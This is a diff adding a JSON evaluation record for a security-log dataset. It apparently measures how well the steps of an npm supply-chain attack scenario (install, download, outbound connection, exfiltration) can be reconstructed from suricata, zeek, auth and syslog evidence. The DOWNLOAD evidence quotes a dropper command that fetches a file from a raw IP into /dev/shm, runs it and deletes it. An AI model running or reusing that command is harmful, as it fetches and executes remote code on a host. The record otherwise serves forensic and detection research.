@@ -1,0 +1,187 @@
+{
+  "scenario": "SC4",
+  "name": "NPMEX",
+  "reconstruction": {
+    "expected_steps": [
+      "INSTALL",
+      "DOWNLOAD",
+      "OUTBOUND_CONN",
+      "EXFIL"
+    ],
+    "observed_steps": [
+      "DOWNLOAD",
+      "INSTALL",
+      "OUTBOUND_CONN"
+    ],
+    "chain_steps": [
+      "OUTBOUND_CONN",
+      "INSTALL",
+      "DOWNLOAD"
+    ],
+    "step_recall": 0.75,
+    "step_precision": 1.0,
+    "chain_recall": 0.75,
+    "chain_precision": 1.0,
+    "reconstructability": 0.75,
+    "reconstructability_mode": "expected_recall",
+    "n_events": 188270
+  },
+  "steps": [
+    {
+      "step": "OUTBOUND_CONN",
+      "present": true,
+      "time_window": [
+        "2025-12-14T11:15:15",
+        "2025-12-15T15:00:38"
+      ],
+      "n_events": 76876,
+      "sources": [
+        "suricata",
+        "zeek"
+      ],
+      "evidence": [
+        {
+          "ts": "2025-12-14T11:16:15",
+          "source": "suricata",
+          "src_ip": "10.0.0.4",
+          "src_port": "41398",
+          "dst_ip": "168.63.129.16",
+          "dst_port": "80",
+          "proto": "TCP",
+          "excerpt": "{\"timestamp\": \"2025-12-14T06:16:15.290604-0500\", \"event_type\": \"http\", \"flow_id\": 2071267333596670, \"tx_id\": 0, \"src_ip\": \"10.0.0.4\", \"src_port\": 41398, \"dest_ip\": \"168.63.129.16\", \"dest_port\": 80, \"proto\": \"TCP\", \"in_iface\": \"eth0\", \"pkt_s…"
+        },
+        {
+          "ts": "2025-12-15T14:36:29",
+          "source": "zeek",
+          "src_ip": "10.0.0.4",
+          "src_port": "56044",
+          "dst_ip": "168.63.129.16",
+          "dst_port": "53",
+          "proto": "udp",
+          "excerpt": ""
+        },
+        {
+          "ts": "2025-12-14T11:16:15",
+          "source": "suricata",
+          "src_ip": "10.0.0.4",
+          "src_port": "56588",
+          "dst_ip": "168.63.129.16",
+          "dst_port": "32526",
+          "proto": "TCP",
+          "excerpt": "{\"timestamp\": \"2025-12-14T06:16:15.292879-0500\", \"event_type\": \"http\", \"flow_id\": 2096310968376952, \"tx_id\": 0, \"src_ip\": \"10.0.0.4\", \"src_port\": 56588, \"dest_ip\": \"168.63.129.16\", \"dest_port\": 32526, \"proto\": \"TCP\", \"in_iface\": \"eth0\", \"pk…"
+        },
+        {
+          "ts": "2025-12-14T11:16:15",
+          "source": "suricata",
+          "src_ip": "10.0.0.4",
+          "src_port": "41410",
+          "dst_ip": "168.63.129.16",
+          "dst_port": "80",
+          "proto": "TCP",
+          "excerpt": "{\"timestamp\": \"2025-12-14T06:16:15.307079-0500\", \"event_type\": \"http\", \"flow_id\": 2155396797088122, \"tx_id\": 0, \"src_ip\": \"10.0.0.4\", \"src_port\": 41410, \"dest_ip\": \"168.63.129.16\", \"dest_port\": 80, \"proto\": \"TCP\", \"in_iface\": \"eth0\", \"pkt_s…"
+        },
+        {
+          "ts": "2025-12-14T11:16:15",
+          "source": "suricata",
+          "src_ip": "10.0.0.4",
+          "src_port": "56598",
+          "dst_ip": "168.63.129.16",
+          "dst_port": "32526",
+          "proto": "TCP",
+          "excerpt": "{\"timestamp\": \"2025-12-14T06:16:15.308549-0500\", \"event_type\": \"http\", \"flow_id\": 2164889439850264, \"tx_id\": 0, \"src_ip\": \"10.0.0.4\", \"src_port\": 56598, \"dest_ip\": \"168.63.129.16\", \"dest_port\": 32526, \"proto\": \"TCP\", \"in_iface\": \"eth0\", \"pk…"
+        }
+      ]
+    },
+    {
+      "step": "INSTALL",
+      "present": true,
+      "time_window": [
+        "2025-12-14T14:02:20",
+        "2025-12-15T14:46:46"
+      ],
+      "n_events": 21,
+      "sources": [
+        "auth",
+        "syslog"
+      ],
+      "evidence": [
+        {
+          "ts": "2025-12-14T14:03:20",
+          "source": "auth",
+          "user": "",
+          "src_ip": "",
+          "src_port": "",
+          "excerpt": "2025-12-14T09:03:20.188957-05:00 HOST_602 sudo: azureofficer : TTY=pts/0 ; PWD=/home/azureofficer/Downloads/SSCMDataset-main/scenarios/sc3/apt_mac ; USER=root ; COMMAND=/usr/bin/apt install nodejs"
+        },
+        {
+          "ts": "2025-12-14T15:00:14",
+          "source": "syslog",
+          "exe": "sudo",
+          "cmdline": "/usr/bin/apt install subversion",
+          "user": "azureofficer",
+          "excerpt": "/usr/bin/apt install subversion | azureofficer : TTY=pts/0 PWD=/home/azureofficer/Downloads USER=root COMMAND=/usr/bin/apt install subversion | sudo"
+        },
+        {
+          "ts": "2025-12-14T14:10:21",
+          "source": "auth",
+          "user": "",
+          "src_ip": "",
+          "src_port": "",
+          "excerpt": "2025-12-14T09:10:21.934470-05:00 HOST_602 sudo: azureofficer : TTY=pts/0 ; PWD=/home/azureofficer/Downloads/SSCMDataset-main/scenarios/sc3/olymptrade ; USER=root ; COMMAND=/usr/bin/apt install npm"
+        },
+        {
+          "ts": "2025-12-14T15:00:14",
+          "source": "auth",
+          "user": "",
+          "src_ip": "",
+          "src_port": "",
+          "excerpt": "2025-12-14T10:00:14.181759-05:00 HOST_602 sudo: azureofficer : TTY=pts/0 ; PWD=/home/azureofficer/Downloads ; USER=root ; COMMAND=/usr/bin/apt install subversion"
+        },
+        {
+          "ts": "2025-12-14T15:17:48",
+          "source": "syslog",
+          "exe": "sudo",
+          "cmdline": "/usr/bin/apt-get install ubuntu-advantage-tools -y",
+          "user": "root",
+          "excerpt": "/usr/bin/apt-get install ubuntu-advantage-tools -y | root : PWD=/var/lib/waagent/Microsoft.CPlat.Core.LinuxPatchExtension-1.6.64 USER=root COMMAND=/usr/bin/apt-get install ubuntu-advantage-tools -y | sudo"
+        }
+      ]
+    },
+    {
+      "step": "DOWNLOAD",
+      "present": true,
+      "time_window": [
+        "2025-12-14T14:42:14",
+        "2025-12-15T14:08:01"
+      ],
+      "n_events": 3,
+      "sources": [
+        "syslog"
+      ],
+      "evidence": [
+        {
+          "ts": "2025-12-14T14:43:14",
+          "source": "syslog",
+          "exe": "sudo",
+          "cmdline": "/usr/bin/bash -c 'cd /dev/shm && (curl -LOk \\'http://37.221.64.235/f/.>_\\' || wget --no-check-certificate \\'http://37.221.64.235/f/.>_\\') && chmod +x \\'.>_\\'  ./\\'.>_\\'  rm -rf \\'.>_\\''",
+          "user": "ftpuser",
+          "excerpt": "/usr/bin/bash -c 'cd /dev/shm && (curl -LOk \\'http://37.221.64.235/f/.>_\\' || wget --no-check-certificate \\'http://37.221.64.235/f/.>_\\') && chmod +x \\'.>_\\' ./\\'.>_\\' rm -rf \\'.>_\\'' | ftpuser : user NOT in sudoers PWD=/home/ftpuser USER=r…"
+        },
+        {
+          "ts": "2025-12-14T14:43:15",
+          "source": "syslog",
+          "exe": "falco",
+          "excerpt": "14:43:15.375894478: Warning File execution detected from /dev/shm | evt_res=SUCCESS file=<NA> proc_cwd=/dev/shm/ proc_pcmdline=bash -c cd /dev/shm && (curl -LOk 'http://37.221.64.235/f/.>_' || wget --no-check-certificate 'http://37.221.64.2…"
+        },
+        {
+          "ts": "2025-12-15T14:07:01",
+          "source": "syslog",
+          "exe": "sudo",
+          "cmdline": "/usr/bin/curl -fsSL https://deb.nodesource.com/setup_20.x",
+          "user": "Newt",
+          "excerpt": "/usr/bin/curl -fsSL https://deb.nodesource.com/setup_20.x | Newt : TTY=pts/0 PWD=/opt/attack-server USER=root COMMAND=/usr/bin/curl -fsSL https://deb.nodesource.com/setup_20.x | sudo"
+        }
+      ]
+    }
+  ]
+}
